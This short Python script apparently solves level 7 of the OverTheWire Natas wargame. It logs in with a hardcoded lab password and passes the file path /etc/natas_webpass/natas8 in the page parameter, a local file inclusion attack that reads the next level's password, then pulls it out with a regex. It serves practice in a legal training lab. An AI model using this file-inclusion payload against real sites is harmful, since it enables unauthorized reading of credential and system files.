#!/usr/bin/env python

from http import cookies
import requests
import re

username = 'natas7'
password = 'jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr'

# headers = {"Referer" : "http://natas5.natas.labs.overthewire.org/"}
# cookies = {"loggedin" : "1"}

url = 'http://%s.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8' % username

response = requests.get(url, auth = (username, password))
content = response.text
# print(content)
print(re.findall('<br>\n(.*)\n\n<!--',content)[0])